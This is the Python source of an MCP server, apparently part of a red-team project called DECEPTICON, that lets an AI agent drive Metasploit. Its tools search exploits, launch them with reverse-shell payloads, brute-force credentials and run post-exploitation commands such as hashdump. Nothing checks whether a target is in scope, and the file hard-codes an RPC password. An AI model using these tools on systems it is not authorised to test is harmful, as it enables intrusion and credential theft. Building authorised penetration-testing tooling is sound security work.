"""
DECEPTICON — Metasploit MCP Server
Controls Metasploit Framework via its RPC API for the Access Agent.

Prerequisites:
  1. Metasploit installed (apt install metasploit-framework)
  2. msfrpcd running:
       msfrpcd -P decepticon_pass -u msf -a 127.0.0.1 -p 55553 -S

Install: pip install mcp pymetasploit3
Run:     python mcp_servers/metasploit_server.py
"""

import asyncio
import json

# FIX: time was used (time.time(), time.sleep()) but never imported
import time

# FIX: datetime was used in all tool implementations but never imported
from datetime import datetime
from typing import Optional

from mcp.server import Server
from mcp.server.stdio import stdio_server
from mcp import types
from docker_utils import run_in_container

# ── Try to import pymetasploit3 ────────────────────────────────────────
try:
    from pymetasploit3.msfrpc import MsfRpcClient

    MSF_AVAILABLE = True
except ImportError:
    MSF_AVAILABLE = False

app = Server("decepticon-metasploit")

# ─────────────────────────────────────────────
# MSF CLIENT SINGLETON
# ─────────────────────────────────────────────

_msf_client: Optional[object] = None


def get_msf_client(
    host="127.0.0.1", port=55553, password="decepticon_pass", ssl=False
) -> tuple:
    """Get or create Metasploit RPC connection. Returns (client, error_str)."""
    global _msf_client
    if not MSF_AVAILABLE:
        return None, "pymetasploit3 not installed. Run: pip install pymetasploit3"
    if _msf_client is not None:
        return _msf_client, None

    # Check if msfrpcd is running in the container
    check_msf = run_in_container("pgrep msfrpcd")
    if not check_msf["success"]:
        start_msf = run_in_container(
            f"msfrpcd -P {password} -u msf -a 0.0.0.0 -p {port} -S"
        )
        if not start_msf["success"]:
            return None, f"Failed to start msfrpcd in container: {start_msf['stderr']}"
        time.sleep(5)

    try:
        _msf_client = MsfRpcClient(password, server=host, port=port, ssl=ssl)
        return _msf_client, None
    except Exception as e:
        return None, f"Cannot connect to msfrpcd on {host}:{port}: {str(e)}"


def msf_error(msg: str) -> list[types.TextContent]:
    return [
        types.TextContent(
            type="text",
            text=json.dumps({"success": False, "error": msg}, indent=2),
        )
    ]


# ─────────────────────────────────────────────
# TOOL DEFINITIONS
# ─────────────────────────────────────────────


@app.list_tools()
async def list_tools() -> list[types.Tool]:
    return [
        types.Tool(
            name="msf_search_module",
            description=(
                "Search Metasploit for exploit modules by CVE, service name, or keyword. "
                "Always run this FIRST to find the exact module path before running an exploit. "
                "Returns module path, rank, description, and required options."
            ),
            inputSchema={
                "type": "object",
                "properties": {
                    "query": {
                        "type": "string",
                        "description": "Search term: CVE (e.g. 'CVE-2017-0144'), service (e.g. 'smb'), or keyword (e.g. 'eternalblue')",
                    },
                    "type": {
                        "type": "string",
                        "description": "Module type filter: exploit, auxiliary, post, payload (default: exploit)",
                        "default": "exploit",
                    },
                },
                "required": ["query"],
            },
        ),
        types.Tool(
            name="msf_module_info",
            description=(
                "Get detailed info about a specific Metasploit module: "
                "required options, available payloads, description, references. "
                "Run this AFTER msf_search_module to understand what options to set."
            ),
            inputSchema={
                "type": "object",
                "properties": {
                    "module_path": {
                        "type": "string",
                        "description": "Full module path (e.g. exploit/windows/smb/ms17_010_eternalblue)",
                    }
                },
                "required": ["module_path"],
            },
        ),
        types.Tool(
            name="msf_run_exploit",
            description=(
                "Execute a Metasploit exploit module against a target. "
                "Requires: module path, target IP, target port. "
                "Optional: custom payload, LHOST/LPORT for reverse shells. "
                "Returns session ID if successful or detailed error if failed."
            ),
            inputSchema={
                "type": "object",
                "properties": {
                    "module_path": {
                        "type": "string",
                        "description": "Exploit module path (e.g. exploit/multi/http/apache_normalize_path_rce)",
                    },
                    "rhosts": {"type": "string", "description": "Target IP address"},
                    "rport": {"type": "integer", "description": "Target port"},
                    "lhost": {
                        "type": "string",
                        "description": "Local IP for reverse shell callback (your attacker IP)",
                        "default": "127.0.0.1",
                    },
                    "lport": {
                        "type": "integer",
                        "description": "Local port for reverse shell listener",
                        "default": 4444,
                    },
                    "payload": {
                        "type": "string",
                        "description": "Payload to use (e.g. linux/x64/meterpreter/reverse_tcp). Leave empty for default.",
                        "default": "",
                    },
                    "extra_options": {
                        "type": "object",
                        "description": "Additional module options as key-value pairs",
                        "default": {},
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Wait time for exploit in seconds",
                        "default": 30,
                    },
                },
                "required": ["module_path", "rhosts", "rport"],
            },
        ),
        types.Tool(
            name="msf_run_auxiliary",
            description=(
                "Run a Metasploit auxiliary module (scanner, brute-forcer, fuzzer). "
                "Use for: port scanning, credential brute force, version detection, "
                "service enumeration without exploitation. "
                "Examples: auxiliary/scanner/ssh/ssh_login, auxiliary/scanner/smb/smb_ms17_010"
            ),
            inputSchema={
                "type": "object",
                "properties": {
                    "module_path": {
                        "type": "string",
                        "description": "Auxiliary module path (e.g. auxiliary/scanner/ssh/ssh_login)",
                    },
                    "rhosts": {"type": "string"},
                    "rport": {"type": "integer"},
                    "extra_options": {
                        "type": "object",
                        "description": "Module-specific options (e.g. {USER_FILE: '/path/to/users.txt', PASS_FILE: '/path/to/pass.txt'})",
                        "default": {},
                    },
                    "timeout": {"type": "integer", "default": 60},
                },
                "required": ["module_path", "rhosts", "rport"],
            },
        ),
        types.Tool(
            name="msf_session_exec",
            description=(
                "Execute a command in an existing Meterpreter or shell session. "
                "Use AFTER msf_run_exploit creates a session. "
                "Runs post-exploitation commands: whoami, getuid, sysinfo, hashdump, etc."
            ),
            inputSchema={
                "type": "object",
                "properties": {
                    "session_id": {
                        "type": "integer",
                        "description": "Session ID from msf_run_exploit output",
                    },
                    "command": {
                        "type": "string",
                        "description": "Command to run in session (e.g. 'whoami' or Meterpreter command like 'sysinfo')",
                    },
                    "timeout": {"type": "integer", "default": 15},
                },
                "required": ["session_id", "command"],
            },
        ),
        types.Tool(
            name="msf_list_sessions",
            description=(
                "List all active Metasploit sessions (shells and Meterpreter). "
                "Returns session IDs, types, target IPs, and user context. "
                "Use this to see what access has been established."
            ),
            inputSchema={"type": "object", "properties": {}},
        ),
    ]


# ─────────────────────────────────────────────
# TOOL IMPLEMENTATIONS
# ─────────────────────────────────────────────


@app.call_tool()
async def call_tool(name: str, arguments: dict) -> list[types.TextContent]:

    # ── SEARCH MODULE ─────────────────────────────────────────────────
    if name == "msf_search_module":
        client, err = get_msf_client()
        if err:
            return msf_error(err)

        query = arguments["query"]
        mod_type = arguments.get("type", "exploit")

        try:
            modules = client.modules.search(query)
            filtered = [m for m in modules if m.get("type", "") == mod_type]

            rank_order = {
                "excellent": 0,
                "great": 1,
                "good": 2,
                "normal": 3,
                "average": 4,
                "low": 5,
                "manual": 6,
            }
            filtered.sort(key=lambda x: rank_order.get(x.get("rank", "manual"), 99))

            result = {
                "tool": "msf_search_module",
                "query": query,
                "type_filter": mod_type,
                "total_found": len(filtered),
                "modules": [
                    {
                        "fullname": m.get("fullname", ""),
                        "name": m.get("name", ""),
                        "rank": m.get("rank", ""),
                        "disclosure_date": m.get("disclosure_date", ""),
                        "description": m.get("description", ""),
                        "references": m.get("references", [])[:3],
                    }
                    for m in filtered[:15]
                ],
            }
        except Exception as e:
            return msf_error(f"Search failed: {str(e)}")

        return [types.TextContent(type="text", text=json.dumps(result, indent=2))]

    # ── MODULE INFO ───────────────────────────────────────────────────
    elif name == "msf_module_info":
        client, err = get_msf_client()
        if err:
            return msf_error(err)

        module_path = arguments["module_path"]

        try:
            mod_type = module_path.split("/")[0]
            mod = client.modules.use(mod_type, module_path)

            options = {}
            for opt_name, opt_info in mod.options.items():
                options[opt_name] = {
                    "required": opt_info.get("required", False),
                    "description": opt_info.get("desc", ""),
                    "default": opt_info.get("default", ""),
                    "current": mod[opt_name] if opt_name in mod else "",
                }

            result = {
                "tool": "msf_module_info",
                "module_path": module_path,
                "name": mod.name,
                "description": mod.description,
                "rank": mod.rank,
                "references": mod.references[:5],
                "required_options": {k: v for k, v in options.items() if v["required"]},
                "optional_options": {
                    k: v for k, v in options.items() if not v["required"]
                },
                "available_payloads": (
                    mod.targetpayloads()[:10] if hasattr(mod, "targetpayloads") else []
                ),
            }
        except Exception as e:
            return msf_error(f"Module info failed for '{module_path}': {str(e)}")

        return [types.TextContent(type="text", text=json.dumps(result, indent=2))]

    # ── RUN EXPLOIT ───────────────────────────────────────────────────
    elif name == "msf_run_exploit":
        client, err = get_msf_client()
        if err:
            return msf_error(err)

        module_path = arguments["module_path"]
        rhosts = arguments["rhosts"]
        rport = arguments["rport"]
        lhost = arguments.get("lhost", "127.0.0.1")
        lport = arguments.get("lport", 4444)
        payload_name = arguments.get("payload", "")
        extra_options = arguments.get("extra_options", {})
        timeout = arguments.get("timeout", 30)

        try:
            exploit = client.modules.use("exploit", module_path)
            exploit["RHOSTS"] = rhosts
            exploit["RPORT"] = rport
            exploit["LHOST"] = lhost
            exploit["LPORT"] = lport

            for k, v in extra_options.items():
                exploit[k] = v

            if payload_name:
                payload = client.modules.use("payload", payload_name)
            else:
                available = (
                    exploit.targetpayloads()
                    if hasattr(exploit, "targetpayloads")
                    else []
                )
                if available:
                    payload = client.modules.use("payload", available[0])
                else:
                    payload = None

            exploit_job = (
                exploit.execute(payload=payload) if payload else exploit.execute()
            )

            session_id = None
            start_time = time.time()
            while time.time() - start_time < timeout:
                await asyncio.sleep(2)
                sessions = client.sessions.list
                for sid, sinfo in sessions.items():
                    if sinfo.get("target_host") == rhosts:
                        session_id = int(sid)
                        break
                if session_id:
                    break

            result = {
                "tool": "msf_run_exploit",
                "module_path": module_path,
                "target": f"{rhosts}:{rport}",
                "success": session_id is not None,
                "session_id": session_id,
                "job_id": exploit_job.get("job_id"),
                "timestamp": datetime.now().isoformat(),
                "next_step": (
                    f"msf_session_exec with session_id={session_id}"
                    if session_id
                    else "Exploit did not produce a session. Try different payload or check target."
                ),
            }
        except Exception as e:
            return msf_error(f"Exploit execution failed: {str(e)}")

        return [types.TextContent(type="text", text=json.dumps(result, indent=2))]

    # ── RUN AUXILIARY ─────────────────────────────────────────────────
    elif name == "msf_run_auxiliary":
        client, err = get_msf_client()
        if err:
            return msf_error(err)

        module_path = arguments["module_path"]
        rhosts = arguments["rhosts"]
        rport = arguments["rport"]
        extra_options = arguments.get("extra_options", {})
        timeout = arguments.get("timeout", 60)

        try:
            aux = client.modules.use("auxiliary", module_path)
            aux["RHOSTS"] = rhosts
            aux["RPORT"] = rport

            for k, v in extra_options.items():
                aux[k] = v

            job = aux.execute()
            await asyncio.sleep(min(timeout, 30))

            result = {
                "tool": "msf_run_auxiliary",
                "module_path": module_path,
                "target": f"{rhosts}:{rport}",
                "success": True,
                "job_id": job.get("job_id"),
                "timestamp": datetime.now().isoformat(),
                "note": "Check MSF console or logs for full output. Brute-force results may take longer.",
            }
        except Exception as e:
            return msf_error(f"Auxiliary run failed: {str(e)}")

        return [types.TextContent(type="text", text=json.dumps(result, indent=2))]

    # ── SESSION EXEC ──────────────────────────────────────────────────
    elif name == "msf_session_exec":
        client, err = get_msf_client()
        if err:
            return msf_error(err)

        session_id = arguments["session_id"]
        command = arguments["command"]
        timeout = arguments.get("timeout", 15)

        try:
            session = client.sessions.session(str(session_id))
            output = session.run_with_output(command, timeout=timeout)

            result = {
                "tool": "msf_session_exec",
                "session_id": session_id,
                "command": command,
                "output": output,
                "success": bool(output),
                "timestamp": datetime.now().isoformat(),
            }
        except Exception as e:
            return msf_error(f"Session exec failed (session {session_id}): {str(e)}")

        return [types.TextContent(type="text", text=json.dumps(result, indent=2))]

    # ── LIST SESSIONS ─────────────────────────────────────────────────
    elif name == "msf_list_sessions":
        client, err = get_msf_client()
        if err:
            return msf_error(err)

        try:
            sessions = client.sessions.list
            session_list = []
            for sid, info in sessions.items():
                session_list.append(
                    {
                        "id": int(sid),
                        "type": info.get("type", ""),
                        "tunnel_local": info.get("tunnel_local", ""),
                        "tunnel_peer": info.get("tunnel_peer", ""),
                        "via_exploit": info.get("via_exploit", ""),
                        "via_payload": info.get("via_payload", ""),
                        "desc": info.get("desc", ""),
                        "info": info.get("info", ""),
                        "workspace": info.get("workspace", ""),
                        "target_host": info.get("target_host", ""),
                        "username": info.get("username", ""),
                        "uuid": info.get("uuid", ""),
                    }
                )

            result = {
                "tool": "msf_list_sessions",
                "success": True,
                "total_sessions": len(session_list),
                "sessions": session_list,
                "timestamp": datetime.now().isoformat(),
            }
        except Exception as e:
            return msf_error(f"Failed to list sessions: {str(e)}")

        return [types.TextContent(type="text", text=json.dumps(result, indent=2))]

    else:
        return msf_error(f"Unknown tool: {name}")


# ─────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────


async def main():
    async with stdio_server() as (read_stream, write_stream):
        await app.run(read_stream, write_stream, app.create_initialization_options())


if __name__ == "__main__":
    asyncio.run(main())
